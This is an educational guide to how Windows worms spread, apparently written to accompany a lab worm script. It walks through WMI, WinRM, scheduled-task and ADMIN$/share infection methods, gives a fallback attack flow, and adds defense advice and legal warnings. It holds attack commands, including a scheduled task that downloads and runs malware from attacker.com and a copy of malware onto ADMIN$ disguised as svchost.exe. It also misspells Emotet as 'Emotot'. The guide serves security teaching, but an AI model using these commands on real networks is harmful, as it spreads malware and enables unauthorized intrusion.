# Windows SMB Worm Techniques - Educational Guide

## 🎓 Purpose
This document explains the Windows-specific spreading techniques added to `simple_hello_world_worm.py` to help you understand how real malware spreads through Windows networks.

---

## 📋 Overview

The `WindowsSMBWorm` class demonstrates **5 real infection methods** used by famous malware:
- **WannaCry** (EternalBlue/SMB)
- **Emotot** (WMI/PowerShell)
- **NotPetya** (Multiple vectors)
- **TrickBot** (Fileless techniques)

---

## 🔍 Infection Methods (In Order of Stealth)

### 1️⃣ WMI Fileless Execution (MOST STEALTHY)

**What it is:**
- Uses Windows Management Instrumentation (WMI)
- Executes PowerShell commands remotely
- **NO files written to disk!**
- Runs entirely in memory

**How it works:**
```bash
wmic /node:"192.168.1.100" /user:"admin" /password:"password" \
  process call create "powershell -Command <payload>"
```

**Real-world usage:**
- Emotot malware
- TrickBot banking trojan
- APT groups (advanced persistent threats)

**Why it's stealthy:**
- No files = No antivirus detection
- Looks like legitimate admin activity
- Leaves minimal forensic evidence

**Detection difficulty:** ⭐⭐⭐⭐⭐ (Very Hard)

---

### 2️⃣ PowerShell Remoting (WinRM)

**What it is:**
- Uses Windows Remote Management (WinRM)
- Creates remote PowerShell session
- Executes commands in memory
- Can download scripts from URLs

**How it works:**
```powershell
$cred = Get-Credential
$session = New-PSSession -ComputerName 192.168.1.100 -Credential $cred
Invoke-Command -Session $session -ScriptBlock { <commands> }
```

**Real-world usage:**
- Corporate network attacks
- Ransomware deployment
- Lateral movement after initial compromise

**Why it's effective:**
- Often enabled in corporate environments
- Legitimate admin tool (hard to block)
- Can download/execute without touching disk

**Detection difficulty:** ⭐⭐⭐⭐ (Hard)

---

### 3️⃣ Scheduled Task + URL Download

**What it is:**
- Creates Windows Scheduled Task on target
- Task downloads malware from attacker's server
- Executes immediately or on schedule
- File temporarily on disk

**How it works:**
```bash
schtasks /create /s 192.168.1.100 /tn "WindowsUpdate" \
  /tr "powershell -Command (New-Object Net.WebClient).DownloadFile('http://attacker.com/malware.exe', 'C:\Temp\update.exe'); Start-Process 'C:\Temp\update.exe'" \
  /sc ONCE /st 00:00
```

**Real-world usage:**
- Many ransomware families
- Cryptominers
- Remote access trojans (RATs)

**Why it's used:**
- Persistence mechanism
- Can survive reboots
- Looks like legitimate update

**Detection difficulty:** ⭐⭐⭐ (Medium)

---

### 4️⃣ ADMIN$ Share File Copy (TRADITIONAL)

**What it is:**
- Connects to hidden ADMIN$ share (C:\Windows\)
- Copies malware file directly
- Creates scheduled task to execute
- Traditional "file-based" infection

**How it works:**
```bash
# Connect to share
net use \\192.168.1.100\admin$ "password" /user:"Administrator"

# Copy malware
copy malware.exe \\192.168.1.100\admin$\Temp\svchost.exe

# Create task to run it
schtasks /create /s 192.168.1.100 /tn "SystemService" /tr "C:\Windows\Temp\svchost.exe" /sc ONSTART /ru SYSTEM
```

**Real-world usage:**
- WannaCry ransomware
- Conficker worm
- Older malware families

**Why it still works:**
- Very reliable
- Works on older systems
- Admin shares often not disabled

**Detection difficulty:** ⭐⭐ (Easy-Medium)

---

### 5️⃣ Public Share Copy (LAST RESORT)

**What it is:**
- Scans for writable public/shared folders
- Copies malware to accessible shares
- Relies on users executing the file
- Social engineering component

**How it works:**
```bash
# List shares
net view \\192.168.1.100

# Copy to public share
copy malware.exe \\192.168.1.100\Public\document.exe
```

**Real-world usage:**
- USB worms (when combined with autorun)
- Network share infections
- Opportunistic malware

**Why it's used:**
- Doesn't require credentials
- Works when other methods fail
- Can spread via user interaction

**Detection difficulty:** ⭐ (Easy)

---

## 🎯 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│ 1. NETWORK DISCOVERY                                        │
│    - Scan for alive hosts (ping sweep)                     │
│    - Check for SMB port (445)                              │
│    - Check for WMI port (135)                              │
│    - Check for WinRM port (5985)                           │
└─────────────────┬───────────────────────────────────────────┘
                  ▼
┌─────────────────────────────────────────────────────────────┐
│ 2. TRY METHOD #1: WMI Fileless (Most Stealth)              │
│    ✓ Success? → Infect & Move to Next Target              │
│    ✗ Failed? → Try Method #2                               │
└─────────────────┬───────────────────────────────────────────┘
                  ▼
┌─────────────────────────────────────────────────────────────┐
│ 3. TRY METHOD #2: PowerShell Remoting                      │
│    ✓ Success? → Infect & Move to Next Target              │
│    ✗ Failed? → Try Method #3                               │
└─────────────────┬───────────────────────────────────────────┘
                  ▼
┌─────────────────────────────────────────────────────────────┐
│ 4. TRY METHOD #3: Scheduled Task + URL                     │
│    ✓ Success? → Infect & Move to Next Target              │
│    ✗ Failed? → Try Method #4                               │
└─────────────────┬───────────────────────────────────────────┘
                  ▼
┌─────────────────────────────────────────────────────────────┐
│ 5. TRY METHOD #4: ADMIN$ Share Copy                        │
│    ✓ Success? → Infect & Move to Next Target              │
│    ✗ Failed? → Try Method #5                               │
└─────────────────┬───────────────────────────────────────────┘
                  ▼
┌─────────────────────────────────────────────────────────────┐
│ 6. TRY METHOD #5: Public Share Copy                        │
│    ✓ Success? → Infect & Move to Next Target              │
│    ✗ Failed? → Mark as Failed & Move to Next Target       │
└─────────────────────────────────────────────────────────────┘
```

---

## 🛡️ Defense Against These Techniques

### Defending Against WMI Attacks:
- ✅ Restrict WMI access to authorized admins only
- ✅ Monitor WMI activity (Event ID 5857, 5858, 5859)
- ✅ Use WMI GPO permissions to limit access
- ✅ Enable advanced threat protection

### Defending Against PowerShell Remoting:
- ✅ Disable WinRM if not needed (`Disable-PSRemoting`)
- ✅ Enable PowerShell logging (Module, Script Block, Transcription)
- ✅ Use Just Enough Administration (JEA)
- ✅ Monitor for suspicious PowerShell commands

### Defending Against Scheduled Tasks:
- ✅ Monitor scheduled task creation (Event ID 4698)
- ✅ Restrict task creation permissions
- ✅ Block execution from Temp folders
- ✅ Use application whitelisting

### Defending Against ADMIN$ Share:
- ✅ Disable admin shares if not needed
- ✅ Use strong passwords (20+ characters)
- ✅ Enable SMB signing
- ✅ Monitor for `net use` commands

### Defending Against Public Share:
- ✅ Remove unnecessary shares
- ✅ Set proper permissions (read-only when possible)
- ✅ Block executables on shares
- ✅ Use file reputation systems

---

## 🧪 Testing in Your Lab

### Safe Testing Environment:
1. **Isolated Network**: Use VirtualBox/VMware with NAT or Host-Only network
2. **Virtual Machines**: At least 2-3 Windows VMs
3. **Weak Credentials**: Set one VM with `admin:admin` for testing
4. **Monitoring**: Enable Windows Event Logs to see attacks

### Test Setup:
```bash
# On your attacker VM (Linux):
python3 simple_hello_world_worm.py

# Select option 3: Windows SMB Worm
# Watch as it tries each infection method
```

### What to Monitor:
- **Event Viewer** → Security → Event ID 4624 (logon attempts)
- **Event Viewer** → Security → Event ID 4698 (scheduled task)
- **PowerShell logs** → Event ID 4103, 4104
- **Network traffic** → SMB connections (port 445)

---

## 📊 Comparison: Simple vs Advanced vs Windows SMB

| Feature | Simple Worm | Advanced Worm | Windows SMB Worm |
|---------|-------------|---------------|------------------|
| **Target OS** | Linux/Unix | Multi-platform | Windows only |
| **Primary Method** | SSH brute force | CVE exploits | Multiple vectors |
| **Stealth Level** | Low | Medium | High |
| **Infection Methods** | 1 (SSH) | 6+ (SSH + CVEs) | 5 (Windows-specific) |
| **Fileless Capability** | ❌ No | ❌ No | ✅ Yes (WMI, PS) |
| **Persistence** | ❌ Basic | ✅ Yes | ✅ Advanced |
| **Real Malware Example** | Mirai | WannaCry | Emotot, TrickBot |

---

## 🎓 Educational Takeaways

### Why Multiple Methods?
Real malware uses **multiple infection vectors** because:
1. Different networks have different security
2. If one method is blocked, others might work
3. Increases success rate dramatically
4. Makes detection/prevention harder

### Why Fileless Attacks?
- **No files on disk** = No antivirus detection
- **Memory-only execution** = No forensic evidence
- **Looks legitimate** = Hard to distinguish from admin activity
- **Modern malware trend** = APT groups use this heavily

### Why Target Windows?
- **Corporate networks** = High-value targets
- **Built-in tools** = WMI, PowerShell, Scheduled Tasks
- **Admin shares** = Historical design decision
- **Lateral movement** = Easy to spread once inside

---

## 🔗 Real-World Examples

### WannaCry (2017)
- Used **EternalBlue** (SMB exploit)
- Spread via **ADMIN$ share**
- Infected **300,000+ computers** in 150 countries
- Caused **$4 billion** in damages

### Emotot (2014-2021)
- Used **WMI execution**
- Used **PowerShell remoting**
- Delivered **ransomware** as payload
- Called **"most dangerous malware"** by FBI

### NotPetya (2017)
- Combined **multiple methods**
- Used **WMI, PsExec, and EternalBlue**
- Targeted **Ukraine** but spread globally
- Caused **$10 billion** in damages

---

## ⚠️ Legal & Ethical Reminder

**NEVER use these techniques without authorization!**

**Legal uses:**
- ✅ Your own lab with your own VMs
- ✅ Company penetration testing (with contract)
- ✅ Bug bounty programs (with permission)
- ✅ Cybersecurity education

**Illegal uses:**
- ❌ Other people's computers
- ❌ Public/company networks without permission
- ❌ Any unauthorized access

**Penalties:**
- Criminal charges
- Prison time (up to 20 years in US)
- Massive fines
- Permanent record

---

## 📚 Further Reading

1. **MITRE ATT&CK Framework**
   - T1047: Windows Management Instrumentation
   - T1021.006: Remote Services - Windows Remote Management
   - T1053.005: Scheduled Task/Job

2. **Books:**
   - "Malware Data Science" by Joshua Saxe
   - "Practical Malware Analysis" by Michael Sikorski

3. **Labs:**
   - TryHackMe: Windows Exploitation Rooms
   - HackTheBox: Windows Machines
   - Blue Team Labs Online: Malware Analysis

---

## 🎯 Summary

You now understand how real Windows malware spreads:
1. **Multiple infection vectors** increase success rate
2. **Fileless techniques** evade antivirus
3. **Built-in Windows tools** (WMI, PowerShell) used as weapons
4. **Lateral movement** spreads through corporate networks
5. **Persistence mechanisms** ensure malware survives reboots

**Use this knowledge for defense, not attack!** 🛡️
